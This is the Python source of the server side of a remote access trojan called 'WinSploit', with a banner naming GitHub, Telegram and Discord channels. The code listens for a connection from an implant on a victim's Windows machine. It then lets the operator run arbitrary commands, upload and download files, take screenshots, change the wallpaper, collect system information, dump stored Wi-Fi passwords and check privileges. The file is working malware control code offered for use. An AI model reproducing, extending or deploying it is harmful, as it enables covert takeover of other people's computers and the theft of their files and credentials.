import socket
from termcolor import colored
import os
from string import ascii_letters, digits
import random



def banner():
    banner_text = f'''


                                                  {colored("(%.","red")}        | Welcome to WinSploit
                                             &&&%{colored("***","cyan")}&&&&     | Version 1.0
                                          &&&&%{colored("********","cyan")}&&&   |  
                                        &&&&&&{colored("**********","cyan")}/&&  | GitHub:
                                     &&&&&&&&&&/{colored("****** **","cyan")}&&  | https://github.com/spectertraww/winsploit
                            %&&  &&&&    &&&&&&&{colored("*****","cyan")}, {colored("**","cyan")}&&  |                   
                         &&&  &&&&        &&&&&&&&/{colored("****", "cyan")}(&&   | Telegram Channel:  
                       &&&%&&&              &&&&&&&&&&&#&    | https://t.me/noobsec  
                        &&&&/             &&&&&                                 |
                       ,&&&&&       &&&&&,&                  | Discord Server:
                     *&&&&&&&&&&&&&&&&&&&%                   | https://discord.gg/UYag3atP2U                                        
                           @@     &&&&&&&                    |
                                 &&&&&&&&&&                  | Have Fun!  
                               .&&& &&&  &&&                                                           
                              &&&&  &&&   &&&&                                                      
                             &&&    %&&     &&&                                                         
                            #&       &&       &&                                                    
                           &&        &&        #&,                                                  
                          &&                                                                        
'''
    print(banner_text)


banner()
LOCALHOST = input(colored("Enter the LHOST --> ","yellow"))
LOCALPORT = int(input(colored("Enter the LPORT --> ","yellow")))
ADDR = (LOCALHOST, LOCALPORT)



# helper function that accepts,listen for incoming connections from the client.
def accept_connection():
    # global variables that will be use through out the whole program.
    global s, client_sock, ip_port
    # creating a tcp socket object for IPv4 addresses.
    s = socket.socket(family=socket.AF_INET, type=socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    # binding the connection to our local machine.
    s.bind(ADDR)
    # listening for incoming connections.
    s.listen(5)
    addr = colored(ADDR, "cyan")
    print(colored(f"\n[+] Listening for incoming connection @{addr}.", "yellow"))
    # accepting the incoming connection and store 
    #client socket object and the client client address
    client_sock, ip_port = s.accept()
    ip_port = colored(ip_port, "cyan")
    print(colored("[+] Connection Established @%s.\n" % str(ip_port), "green"))


# helper function that will help use to recieve all 
#the data being send by the client
def recv_all():
    # number of bytes to be recieved at a time
    BUFFER_SIZE = 4096
    # initializing the data variable to store the recieved data in bytes
    data = b""
    # infinity loop to recieve data as long 
    #there is still data to be recieved from the client
    while True:
            # recieving chunks of data 
            chunk = client_sock.recv(BUFFER_SIZE)
            # concatenate the recieve chunk of data with the actual data 
            data +=chunk
            # if there is no data to be recieved break out of the loop
            if not chunk:
                break
            # return the full data and decode it to readable string         
            return data.decode()

# helper function to download files from the server
def download_file(download_folder, file_basename):
    # assigning the path to save the downloaded file
    download_path = rf"{download_folder}\{file_basename}"

    # checking if the file to be save exists, if it exists 
    # append some random chars to the filename
    # using the rand_string() function which returns 5 random chars
    if os.path.exists(download_path):
        filename_list = file_basename.split(".")
        filename = ".".join(filename_list[:-1])
        file_ext = filename_list[-1]
        full_filename = f"{filename}-{rand_string()}.{file_ext}"
        download_path = rf"{download_folder}\{full_filename}"
    # recieveing and saving the file            
    with open(download_path, "wb") as file:
        data_size = int(client_sock.recv(64).decode())
        bytes_read = client_sock.recv(data_size)
        file.write(bytes_read)

# helper function to upload files to client system
def upload_file(filename_path):
    filesize = os.path.getsize(filename_path)
    client_sock.send(str(filesize).encode())
    with open(filename_path, "rb") as file:
        bytes_read = file.read(int(filesize))
        client_sock.sendall(bytes_read)
        

# helper function for generating some randoms chars
# it returns a random combination of ascii chars and digits only
def rand_string():
    return "".join(random.SystemRandom().choice(ascii_letters + digits) for _ in range(5)) 


# a function to download to download a screenshot from the victim's pc
# using the download_file() helper function
def screenshot():
   download_file("screenshots","monitor-1.png")

# helper change_wallpaper to change the remote system wallpaper
def change_wallpaper(filename_path):
    upload_file(filename_path)
    #required_ext = ["jpg", "png"]
    #filename = os.path.basename(file_path)
    #filename_list = filename.split(".")
    #file_ext = filename_list[-1]
    #if file_ext in required_ext:
        #client_sock.send(" ".encode())
        #upload_file(file_path)
    #else:
        #print(colored("[!!] FileTypeError", "red"))
        #client_sock.send("FileTypeError".encode())


# a function to handle and control the client         
def handle_client_shell():
    # recieve the current working directory of the victim's system
    # and print it out as follows
    #winsploit:~C:\Desktop$
    cwd = colored("%s" % recv_all(), "cyan")
    # infinty loop that will promt us to use some commands and send
    # send the commands to the victim's pc to be executed
    while True:
        # waiting for the command to be issued
        cmd = input(f"winsploit@{cwd}> ")
        # send the command the commnad to the victim's pc
        client_sock.send(cmd.encode("utf-8"))
        # quit the server and the client if command is q
        if cmd == "q":
            break
            # changing directory with cd [directoryname]
        elif cmd[:2] == "cd" and len(cmd) > 1:
            # returning the cwd if the [directoryname] is None
            if cmd[:2] == "cd" and cmd[3:] == "":
                cwd = colored("%s" % recv_all(), "cyan")
                # if [directoryname] has value then check if the directory exists
                # if it doesn't exist return a FileNotFoundError else return the cwd
            elif cmd[:2]=="cd" and cmd[3:] !="":
                cmd_result = recv_all()
                if "FolderNotFoundError" in cmd_result:
                    print(colored(cmd_result, "red"))
                else:
                    cwd = colored("%s" % cmd_result, "cyan")
        # using the helper upload_file() function to upload file to the target system
        # if the user provided command is upload                       
        elif cmd[:6] == "upload":
            filename = cmd[7:]
            upload_file(filename)
        # using the helper download_file() function to download files from the target system
        # if the user provided command is download    
        elif cmd[:8] == "download":
            file_basename = os.path.basename(cmd[9:])
            download_file("downloads", file_basename)
        # using the helper screenshot() function to take and dowload screenshots
        # from the remote system if the user provided command is screenshot    
        elif cmd == "screenshot":
            screenshot()
        # using the helper change_wallpaper() function to change the target system
        # wallpaper if attacker provided command is chwallpaper    
        elif cmd[:11] == "chwallpaper":
            change_wallpaper(cmd[12:])   
        # getting victim's pc system info
        # if user provided command is sysinfo    
        elif cmd == "sysinfo":
            print("="* 20 , "System Information", "="*20)
            print(recv_all())
            print("="* 20 , "System Information", "="*20)
        elif cmd == "dump_wifipass":
            print(recv_all())
        elif cmd == "check_privs":
            print(recv_all())
        elif cmd == "show_help":
            print(recv_all())         
        # if user doesn't issue any of the commands above, try to execute some
        # system commands and return either stderr or stdout result 
        # if the command fail to execute or successfully executed respectively                                             
        else:
            msg = recv_all()
            print(msg)


# start the whole program here
def main():
    accept_connection()
    handle_client_shell()
    s.close()

# calling the main function
if __name__ == "__main__":
    main()    


